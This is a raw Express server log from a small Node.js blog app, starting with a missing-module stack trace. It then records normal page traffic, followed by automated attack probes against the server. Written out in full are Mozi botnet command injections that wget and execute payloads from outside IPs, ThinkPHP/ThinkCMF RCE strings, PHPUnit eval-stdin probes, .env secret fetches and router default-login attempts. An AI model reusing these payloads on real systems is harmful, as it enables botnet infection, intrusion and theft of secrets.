internal/modules/cjs/loader.js:969
  throw err;
  ^

Error: Cannot find module './routes/blogAdd'
Require stack:
- /home/bitnami/blogger/app.js
- /home/bitnami/blogger/bin/www
    at Function.Module._resolveFilename (internal/modules/cjs/loader.js:966:15)
    at Function.Module._load (internal/modules/cjs/loader.js:842:27)
    at Module.require (internal/modules/cjs/loader.js:1026:19)
    at require (internal/modules/cjs/helpers.js:72:18)
    at Object.<anonymous> (/home/bitnami/blogger/app.js:9:21)
    at Module._compile (internal/modules/cjs/loader.js:1138:30)
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1158:10)
    at Module.load (internal/modules/cjs/loader.js:986:32)
    at Function.Module._load (internal/modules/cjs/loader.js:879:14)
    at Module.require (internal/modules/cjs/loader.js:1026:19) {
  code: 'MODULE_NOT_FOUND',
  requireStack: [ '/home/bitnami/blogger/app.js', '/home/bitnami/blogger/bin/www' ]
}
Port 3000 is already in use
[0mGET /js/bootstrap.min.js [33m404 [0m0.809 ms - 913[0m
[0mGET /blogList [36m304 [0m1.082 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.742 ms - -[0m
[0mGET /css/bootstrap.min.css [33m404 [0m1.286 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m1.118 ms - 913[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.613 ms - 913[0m
[0mGET /js/bootstrap.min.js [33m404 [0m0.707 ms - 913[0m
[0mGET / [36m304 [0m2.791 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.432 ms - -[0m
[0mGET /css/bootstrap.min.css [33m404 [0m0.792 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m1.453 ms - 913[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.889 ms - 913[0m
[0mGET /js/bootstrap.min.js [33m404 [0m2.279 ms - 913[0m
[0mGET /js/bootstrap.min.js [33m404 [0m0.765 ms - 913[0m
[0mGET /blogList [36m304 [0m0.913 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.732 ms - -[0m
[0mGET /css/bootstrap.min.css [33m404 [0m1.190 ms - 913[0m
[0mGET /js/bootstrap.min.js [33m404 [0m2.411 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m2.903 ms - 913[0m
[0mGET /css/fontawesome-all.css [33m404 [0m3.349 ms - 913[0m
[0mGET /blogAdd [36m304 [0m1.510 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.403 ms - -[0m
[0mGET /js/bootstrap.min.js [33m404 [0m1.832 ms - 913[0m
[0mGET /css/bootstrap.min.css [33m404 [0m2.272 ms - 913[0m
[0mGET /css/fontawesome-all.css [33m404 [0m2.725 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m3.187 ms - 913[0m
[0mGET /blogAdd [36m304 [0m1.367 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.385 ms - -[0m
[0mGET /js/jquery.min.js [33m404 [0m1.596 ms - 913[0m
[0mGET /css/bootstrap.min.css [33m404 [0m2.020 ms - 913[0m
[0mGET /css/fontawesome-all.css [33m404 [0m2.387 ms - 913[0m
[0mGET /js/bootstrap.min.js [33m404 [0m0.701 ms - 913[0m
[0mGET / [32m200 [0m10.147 ms - 954[0m
[0mGET /css/bootstrap.min.css [33m404 [0m1.659 ms - 913[0m
[0mGET /stylesheets/style.css [32m200 [0m5.322 ms - 111[0m
[0mGET /js/jquery.min.js [33m404 [0m2.960 ms - 913[0m
[0mGET /js/bootstrap.min.js [33m404 [0m3.414 ms - 913[0m
[0mGET /css/fontawesome-all.css [33m404 [0m2.850 ms - 913[0m
[0mGET /js/bootstrap.min.js [33m404 [0m0.827 ms - 913[0m
[0mGET /favicon.ico [33m404 [0m1.018 ms - 913[0m
[0mGET /blogAdd [32m200 [0m1.728 ms - 940[0m
[0mGET /stylesheets/style.css [36m304 [0m1.037 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m2.064 ms - 913[0m
[0mGET /css/bootstrap.min.css [33m404 [0m2.557 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m3.067 ms - 913[0m
[0mGET /js/bootstrap.min.js [33m404 [0m0.794 ms - 913[0m
[0mGET /blogList [32m200 [0m1.185 ms - 944[0m
[0mGET /stylesheets/style.css [36m304 [0m0.734 ms - -[0m
[0mGET /css/bootstrap.min.css [33m404 [0m1.217 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m1.548 ms - 913[0m
[0mGET /js/bootstrap.min.js [33m404 [0m2.054 ms - 913[0m
[0mGET /css/fontawesome-all.css [33m404 [0m2.523 ms - 913[0m
[0mGET /blogAdd [36m304 [0m1.718 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.367 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m2.047 ms - 913[0m
[0mGET /js/bootstrap.min.js [33m404 [0m2.457 ms - 913[0m
[0mGET /css/bootstrap.min.css [33m404 [0m2.816 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m3.250 ms - 913[0m
[0mGET /config/getuser?index=0 [33m404 [0m10.426 ms - 913[0m
[0mGET /blogAdd [36m304 [0m2.085 ms - -[0m
[0mGET /css/bootstrap.min.css [33m404 [0m1.614 ms - 913[0m
[0mGET /stylesheets/style.css [36m304 [0m2.354 ms - -[0m
[0mGET /js/jquery.min.js [33m404 [0m1.699 ms - 913[0m
[0mGET /js/bootstrap.min.js [33m404 [0m2.230 ms - 913[0m
[0mGET /css/fontawesome-all.css [33m404 [0m2.805 ms - 913[0m
[0mGET / [36m304 [0m1.288 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.791 ms - -[0m
[0mGET /css/bootstrap.min.css [33m404 [0m1.329 ms - 913[0m
[0mGET /css/fontawesome-all.css [33m404 [0m0.776 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m1.910 ms - 913[0m
[0mGET /js/bootstrap.min.js [33m404 [0m2.406 ms - 913[0m
[0mGET /blogList [36m304 [0m1.048 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.382 ms - -[0m
[0mGET /css/bootstrap.min.css [33m404 [0m0.789 ms - 913[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.183 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m1.604 ms - 913[0m
[0mGET /js/bootstrap.min.js [33m404 [0m0.782 ms - 913[0m
[0mGET /blogAdd [36m304 [0m1.015 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m2.587 ms - 913[0m
[0mGET /stylesheets/style.css [36m304 [0m2.636 ms - -[0m
[0mGET /css/bootstrap.min.css [33m404 [0m2.020 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m1.119 ms - 913[0m
[0mGET /js/bootstrap.min.js [33m404 [0m1.550 ms - 913[0m
[0mGET / [36m304 [0m11.556 ms - -[0m
[0mGET /stylesheets/style.css [32m200 [0m3.569 ms - 111[0m
[0mGET /css/fontawesome-all.css [33m404 [0m3.522 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m3.946 ms - 913[0m
[0mGET /js/bootstrap.min.js [32m200 [0m4.810 ms - 60044[0m
[0mGET /css/bootstrap.min.css [32m200 [0m6.222 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m1.015 ms - 913[0m
[0mGET /blogList [36m304 [0m1.211 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m2.826 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m4.083 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m2.206 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m3.968 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m4.468 ms - 913[0m
[0mGET /blogAdd [36m304 [0m1.187 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.983 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.059 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m3.518 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m3.236 ms - 913[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.525 ms - -[0m
[0mGET /blogList [36m304 [0m1.019 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.393 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.672 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.396 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m3.547 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m3.666 ms - 913[0m
[0mGET / [36m304 [0m1.022 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.363 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.751 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.803 ms - -[0m
[0mGET /js/jquery.min.js [33m404 [0m3.285 ms - 913[0m
[0mGET /css/fontawesome-all.css [33m404 [0m3.797 ms - 913[0m
[0mGET /blogAdd [36m304 [0m1.049 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.345 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.495 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.316 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m3.145 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m3.296 ms - 913[0m
[0mGET / [36m304 [0m10.407 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.176 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.613 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m2.165 ms - 913[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.088 ms - -[0m
[0mGET /js/jquery.min.js [33m404 [0m1.829 ms - 913[0m
[0mGET /favicon.ico [33m404 [0m1.083 ms - 913[0m
[0mGET /blogList [32m200 [0m1.233 ms - 945[0m
[0mGET /stylesheets/style.css [36m304 [0m0.936 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.821 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m3.096 ms - 913[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.684 ms - -[0m
[0mGET /js/jquery.min.js [33m404 [0m1.994 ms - 913[0m
[0mGET /blogAdd [32m200 [0m1.152 ms - 940[0m
[0mGET /stylesheets/style.css [36m304 [0m0.386 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.660 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.665 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m3.474 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m3.154 ms - 913[0m
[0mGET /favicon.ico [33m404 [0m0.971 ms - 913[0m
[0mGET /boaform/admin/formLogin?username=user&psd=user [33m404 [0m0.983 ms - 913[0m
[0mGET /boaform/admin/formLogin?username=user&psd=user [33m404 [0m1.811 ms - 913[0m
[0mHEAD /robots.txt [33m404 [0m0.969 ms - 913[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://27.7.90.167:34419/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m0.933 ms - 913[0m
[0mPOST /HNAP1/ [33m404 [0m1.897 ms - 913[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.905 ms - 913[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m3.169 ms - 954[0m
[0mGET / [32m200 [0m0.828 ms - 954[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.893 ms - 913[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.790 ms - 954[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.903 ms - 913[0m
[0mGET / [32m200 [0m0.868 ms - 954[0m
[0mPOST /api/jsonws/invoke [33m404 [0m19.947 ms - 913[0m
[0mGET / [32m200 [0m0.819 ms - 954[0m
[0mGET / [32m200 [0m0.755 ms - 954[0m
[0mGET /static/theme/img/login/bg1.jpg [33m404 [0m0.908 ms - 913[0m
[0mHEAD /robots.txt [33m404 [0m0.951 ms - 913[0m
[0mGET / [32m200 [0m0.780 ms - 954[0m
[0mGET /.env [33m404 [0m0.779 ms - 913[0m
[0mPOST / [33m404 [0m2.438 ms - 913[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.907 ms - 913[0m
[0mGET /hudson [33m404 [0m0.904 ms - 913[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.063 ms - 913[0m
[0mGET / [32m200 [0m0.784 ms - 954[0m
[0mGET /stylesheets/style.css [32m200 [0m3.237 ms - 111[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.056 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m1.920 ms - 913[0m
[0mGET /js/bootstrap.min.js [32m200 [0m1.608 ms - 60044[0m
[0mGET /css/bootstrap.min.css [32m200 [0m2.075 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.827 ms - 913[0m
[0mGET /blogList [32m200 [0m2.301 ms - 945[0m
[0mGET /css/fontawesome-all.css [33m404 [0m0.968 ms - 913[0m
[0mGET /stylesheets/style.css [36m304 [0m0.795 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.057 ms - -[0m
[0mGET /js/jquery.min.js [33m404 [0m2.621 ms - 913[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.440 ms - -[0m
[0mGET /blogAdd [32m200 [0m1.600 ms - 940[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.452 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.575 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.845 ms - -[0m
[0mGET /js/jquery.min.js [33m404 [0m3.179 ms - 913[0m
[0mGET /css/fontawesome-all.css [33m404 [0m3.140 ms - 913[0m
[0mGET http://httpheader.net/azenv.php [33m404 [0m1.034 ms - 913[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://106.0.57.249:34991/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.940 ms - 913[0m
[0mGET /boaform/admin/formLogin?username=user&psd=user [33m404 [0m0.972 ms - 913[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://123.4.31.60:59313/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.949 ms - 913[0m
[0mGET / [32m200 [0m1.760 ms - 954[0m
[0mGET / [32m200 [0m0.629 ms - 954[0m
[0mPOST /HNAP1/ [33m404 [0m0.854 ms - 913[0m
[0mGET / [32m200 [0m0.733 ms - 954[0m
[0mGET / [32m200 [0m0.845 ms - 954[0m
[0mGET / [32m200 [0m0.874 ms - 954[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m1.062 ms - 913[0m
[0mPOST /HNAP1/ [33m404 [0m1.997 ms - 913[0m
[0mGET / [32m200 [0m0.859 ms - 954[0m
[0mGET / [32m200 [0m1.409 ms - 954[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.962 ms - 913[0m
[0mGET / [32m200 [0m0.773 ms - 954[0m
[0mGET /.env [33m404 [0m0.778 ms - 913[0m
[0mGET /.remote [33m404 [0m0.769 ms - 913[0m
[0mGET /.local [33m404 [0m0.762 ms - 913[0m
[0mGET /.production [33m404 [0m0.692 ms - 913[0m
[0mPOST //admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.707 ms - 913[0m
[0mPOST //api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.751 ms - 913[0m
[0mPOST //backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.644 ms - 913[0m
[0mPOST //blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.603 ms - 913[0m
[0mPOST //cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.705 ms - 913[0m
[0mPOST //crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.609 ms - 913[0m
[0mPOST //demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.556 ms - 913[0m
[0mPOST //dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.542 ms - 913[0m
[0mPOST //laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.686 ms - 913[0m
[0mPOST //lib/phpunit/Util/PHP/eval-stdin.php [33m404 [0m0.558 ms - 913[0m
[0mPOST //lib/phpunit/phpunit/Util/PHP/eval-stdin.php [33m404 [0m0.647 ms - 913[0m
[0mPOST //lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.584 ms - 913[0m
[0mPOST //lib/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.727 ms - 913[0m
[0mPOST //new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.496 ms - 913[0m
[0mPOST //old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.666 ms - 913[0m
[0mPOST //panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.724 ms - 913[0m
[0mPOST //phpunit/Util/PHP/eval-stdin.php [33m404 [0m0.736 ms - 913[0m
[0mPOST //phpunit/phpunit/Util/PHP/eval-stdin.php [33m404 [0m0.591 ms - 913[0m
[0mPOST //phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.563 ms - 913[0m
[0mPOST //phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.552 ms - 913[0m
[0mPOST //protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.594 ms - 913[0m
[0mPOST //sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.588 ms - 913[0m
[0mPOST //vendor/phpunit/Util/PHP/eval-stdin.php [33m404 [0m0.620 ms - 913[0m
[0mPOST //vendor/phpunit/phpunit/Util/PHP/eval-stdin.php [33m404 [0m0.544 ms - 913[0m
[0mPOST //vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.369 ms - 913[0m
[0mPOST //vendor/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.533 ms - 913[0m
[0mPOST //wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.548 ms - 913[0m
[0mPOST //wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.527 ms - 913[0m
[0mPOST //wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.584 ms - 913[0m
[0mPOST //wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.563 ms - 913[0m
[0mPOST //www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.536 ms - 913[0m
[0mGET / [32m200 [0m0.838 ms - 954[0m
[0mGET / [32m200 [0m0.794 ms - 954[0m
[0mGET / [32m200 [0m0.842 ms - 954[0m
[0mGET / [32m200 [0m1.474 ms - 954[0m
[0mGET / [32m200 [0m0.852 ms - 954[0m
[0mGET / [32m200 [0m0.777 ms - 954[0m
[0mGET /portal/redlion [33m404 [0m10.964 ms - 913[0m
[0mGET / [32m200 [0m0.855 ms - 954[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m0.999 ms - 913[0m
[0mHEAD /robots.txt [33m404 [0m0.986 ms - 913[0m
[0mGET / [32m200 [0m0.815 ms - 954[0m
[0mPOST /goform/webLogin [33m404 [0m1.054 ms - 913[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m1.856 ms - 913[0m
[0mGET / [32m200 [0m0.714 ms - 954[0m
[0mHEAD /MjZL [33m404 [0m0.980 ms - 913[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m1.011 ms - 913[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.890 ms - 913[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m1.075 ms - 913[0m
[0mGET /.env [33m404 [0m0.801 ms - 913[0m
[0mPOST / [33m404 [0m0.830 ms - 913[0m
[0mGET / [32m200 [0m0.818 ms - 954[0m
[0mGET / [32m200 [0m0.783 ms - 954[0m
[0mGET / [32m200 [0m0.771 ms - 954[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.923 ms - 913[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.792 ms - 954[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.779 ms - 954[0m
[0mGET / [32m200 [0m0.820 ms - 954[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.945 ms - 913[0m
[0mGET / [32m200 [0m0.823 ms - 954[0m
[0mGET / [32m200 [0m0.760 ms - 954[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://1.246.223.130:4055/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m1.785 ms - 913[0m
[0mHEAD /robots.txt [33m404 [0m0.909 ms - 913[0m
[0mGET / [32m200 [0m0.722 ms - 954[0m
[0mGET / [32m200 [0m0.823 ms - 954[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.895 ms - 913[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.899 ms - 913[0m
[0mGET /stalker_portal/c/version.js [33m404 [0m0.925 ms - 913[0m
[0mGET /client_area/ [33m404 [0m0.876 ms - 913[0m
